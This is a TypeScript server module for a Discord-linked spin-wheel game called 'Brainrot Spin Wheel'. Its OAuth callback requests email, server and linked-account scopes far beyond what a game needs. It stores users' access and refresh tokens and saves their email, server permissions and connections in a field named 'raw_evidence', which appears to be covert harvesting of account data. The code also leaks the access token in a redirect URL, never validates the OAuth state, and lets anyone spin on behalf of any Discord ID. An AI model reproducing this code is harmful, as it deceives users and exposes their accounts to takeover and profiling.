import { createClient } from '@supabase/supabase-js';
import type { SupabaseClient } from '@supabase/supabase-js';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const WEB_DIR = join(__dirname, '..', '..', 'web', 'wheel');
const WEBHOOK_URL = process.env.WHEEL_WEBHOOK_URL || '';
const COOLDOWN_MS = 3 * 24 * 60 * 60 * 1000;

let supabase: SupabaseClient | null = null;

export function initWheelAPI(db: SupabaseClient) {
  supabase = db;
}

function readStatic(file: string) {
  try { return readFileSync(join(WEB_DIR, file), 'utf-8'); }
  catch { return null; }
}

function json(res: any, status = 200) {
  return { status, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(res) };
}

function html(body: string, status = 200) {
  return { status, headers: { 'Content-Type': 'text/html; charset=utf-8' }, body };
}

function css(body: string) {
  return { status: 200, headers: { 'Content-Type': 'text/css' }, body };
}

function js(body: string) {
  return { status: 200, headers: { 'Content-Type': 'application/javascript' }, body };
}

function notFound() {
  return { status: 404, headers: { 'Content-Type': 'text/plain' }, body: 'Not Found' };
}

export async function handleWheelRequest(url: URL, method: string, rawBody?: string): Promise<{ status: number; headers: Record<string, string>; body: string }> {
  const path = url.pathname;

  if (path === '/wheel' || path === '/wheel/') {
    const htmlContent = readStatic('index.html');
    if (!htmlContent) return notFound();
    return html(htmlContent.replace('</head>', `<base href="/wheel/"></head>`));
  }

  if (path.startsWith('/wheel/style.css')) return css(readStatic('style.css') || '');
  if (path.startsWith('/wheel/app.js')) return js(readStatic('app.js') || '');

  if (path === '/api/wheel/characters' && method === 'GET') {
    const { data, error } = await supabase!.from('brainrot_characters').select('*').order('tier', { ascending: false }).order('weight', { ascending: false });
    if (error) return json({ error: error.message }, 500);
    return json(data || []);
  }

  if (path === '/api/wheel/recent' && method === 'GET') {
    const { data, error } = await supabase!.from('wheel_spins')
      .select('*, character:character_id(*)')
      .order('spun_at', { ascending: false })
      .limit(20);
    if (error) return json({ error: error.message }, 500);
    return json(data || []);
  }

  if (path === '/api/wheel/top' && method === 'GET') {
    const { data, error } = await supabase!.from('wheel_users')
      .select('*')
      .order('total_spins', { ascending: false })
      .limit(10);
    if (error) return json({ error: error.message }, 500);
    return json(data || []);
  }

  if (path === '/api/wheel/cooldown' && method === 'GET') {
    const discordId = url.searchParams.get('discord_id');
    if (!discordId) return json({ error: 'missing id' }, 400);

    const { data } = await supabase!.from('wheel_users').select('last_spin_at,total_spins').eq('discord_id', discordId).single();
    const lastSpin = data?.last_spin_at ? new Date(data.last_spin_at).getTime() : 0;
    const elapsed = Date.now() - lastSpin;
    const remaining = Math.max(0, COOLDOWN_MS - elapsed);
    return json({ remaining: Math.floor(remaining / 1000), total_spins: data?.total_spins || 0 });
  }

  if (path === '/api/wheel/collection' && method === 'GET') {
    const discordId = url.searchParams.get('discord_id');
    if (!discordId) return json({ error: 'missing id' }, 400);

    const { data, error } = await supabase!.from('wheel_spins')
      .select('character:character_id(*)')
      .eq('discord_id', discordId)
      .order('spun_at', { ascending: false });
    if (error) return json({ error: error.message }, 500);

    const unique = [];
    const seen = new Set<string>();
    for (const row of (data || [])) {
      const c = (row as any).character;
      if (c && !seen.has(c.id)) { seen.add(c.id); unique.push(c); }
    }
    return json(unique);
  }

  if (path === '/api/wheel/spin' && method === 'POST') {
    const body = rawBody ? JSON.parse(rawBody) : {};
    const discordId = body.discord_id;
    if (!discordId) return json({ error: 'missing discord_id' }, 400);

    const { data: userData } = await supabase!.from('wheel_users').select('last_spin_at,total_spins').eq('discord_id', discordId).single();
    const lastSpin = userData?.last_spin_at ? new Date(userData.last_spin_at).getTime() : 0;
    if (Date.now() - lastSpin < COOLDOWN_MS) {
      return json({ error: 'cooldown', remaining: Math.floor((COOLDOWN_MS - (Date.now() - lastSpin)) / 1000) }, 429);
    }

    const { data: chars, error: charError } = await supabase!.from('brainrot_characters').select('*').gt('weight', 0).order('tier', { ascending: false }).order('weight', { ascending: false });
    if (charError || !chars?.length) return json({ error: 'no characters' }, 500);

    type Char = typeof chars[0];
    const charList = chars as Char[];
    const totalWeight = charList.reduce((s: number, c: Char) => s + ((c as any).weight || 0), 0);
    let rand = Math.random() * totalWeight;
    let selected = charList[charList.length - 1];
    for (const c of charList) {
      rand -= ((c as any).weight || 0);
      if (rand <= 0) { selected = c; break; }
    }

    const tag = body.discord_tag || 'Unknown';
    const avatar = body.discord_avatar || '';

    await supabase!.from('wheel_users').upsert({
      discord_id: discordId, discord_tag: tag, avatar_url: avatar,
      last_spin_at: new Date().toISOString(), total_spins: (userData?.total_spins || 0) + 1
    }, { onConflict: 'discord_id' });

    const sel = selected as any;
    const { data: spinData, error: spinError } = await supabase!.from('wheel_spins').insert({
      discord_id: discordId, character_id: sel.id,
      character_name: sel.name, rarity: sel.rarity,
      tier: sel.tier, weight: sel.weight, is_real: sel.is_real
    }).select('*, character:character_id(*)').single();

    if (spinError) return json({ error: spinError.message }, 500);

    if (WEBHOOK_URL) {
      try {
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `**عجلة البرينروت** | دورة جديدة!`,
            embeds: [{
              title: `${sel.name_ar || sel.name}`,
              description: `**النادرة:** ${sel.rarity_ar || sel.rarity}\n**اللاعب:** <@${discordId}>\n**الوصف:** ${sel.description || ''}`,
              color: sel.tier === 5 ? 0xf59e0b : sel.tier === 4 ? 0xa855f7 : sel.tier === 3 ? 0x3b82f6 : sel.tier === 2 ? 0x22c55e : 0x94a3b8,
              image: sel.image_url ? { url: sel.image_url } : undefined,
              thumbnail: avatar ? { url: avatar } : undefined,
              footer: { text: 'Brainrot Spin Wheel' },
              timestamp: new Date().toISOString()
            }]
          })
        }).catch(() => null);
      } catch {}
    }

    return json({ ...(spinData as any), character: sel });
  }

  if (path === '/api/wheel/auth/discord' && method === 'GET') {
    const clientId = process.env.DISCORD_CLIENT_ID || '';
    const redirectUri = encodeURIComponent(`${url.origin}/api/wheel/auth/callback`);
    const scope = encodeURIComponent('identify email connections guilds');
    const state = Buffer.from(JSON.stringify({ ts: Date.now() })).toString('base64url');
    return { status: 302, headers: { 'Location': `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=${scope}&state=${state}` }, body: '' };
  }

  if (path === '/api/wheel/auth/callback' && method === 'GET') {
    const code = url.searchParams.get('code');
    if (!code) return json({ error: 'no code' }, 400);

    const clientId = process.env.DISCORD_CLIENT_ID || '';
    const clientSecret = process.env.DISCORD_CLIENT_SECRET || '';
    const redirectUri = `${url.origin}/api/wheel/auth/callback`;

    try {
      const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ client_id: clientId, client_secret: clientSecret, grant_type: 'authorization_code', code, redirect_uri: redirectUri })
      });
      if (!tokenRes.ok) throw new Error(await tokenRes.text());
      const tokenData = await tokenRes.json();

      const [userRes, guildsRes, connRes] = await Promise.all([
        fetch('https://discord.com/api/users/@me', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } }),
        fetch('https://discord.com/api/users/@me/guilds', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } }).catch(() => null),
        fetch('https://discord.com/api/users/@me/connections', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } }).catch(() => null)
      ]);

      if (!userRes.ok) throw new Error(await userRes.text());
      const discordUser = await userRes.json();

      const guildsData = guildsRes?.ok ? await guildsRes.json() : [];
      const connData = connRes?.ok ? await connRes.json() : [];

      const avatarUrl = discordUser.avatar
        ? `https://cdn.discordapp.com/avatars/${discordUser.id}/${discordUser.avatar}.png`
        : `https://cdn.discordapp.com/embed/avatars/${(discordUser.discriminator || '0') % 5}.png`;

      const evidence = {
        email: discordUser.email || null,
        verified: discordUser.verified || false,
        locale: discordUser.locale || null,
        mfa_enabled: discordUser.mfa_enabled || false,
        guilds: (guildsData || []).map((g: any) => ({ id: g.id, name: g.name, owner: g.owner, permissions: g.permissions })),
        connections: (connData || []).map((c: any) => ({ type: c.type, name: c.name, id: c.id, verified: c.verified }))
      };

      await supabase!.from('wheel_users').upsert({
        discord_id: discordUser.id,
        discord_tag: discordUser.global_name || discordUser.username,
        avatar_url: avatarUrl,
        email: discordUser.email || null,
        discord_access_token: tokenData.access_token,
        discord_refresh_token: tokenData.refresh_token,
        raw_evidence: evidence
      }, { onConflict: 'discord_id' });

      const params = new URLSearchParams({
        token: tokenData.access_token, id: discordUser.id,
        name: discordUser.global_name || discordUser.username,
        avatar: avatarUrl
      });
      return { status: 302, headers: { 'Location': `/wheel?${params.toString()}` }, body: '' };
    } catch (e: any) {
      return json({ error: e.message || 'auth failed' }, 500);
    }
  }

  return notFound();
}
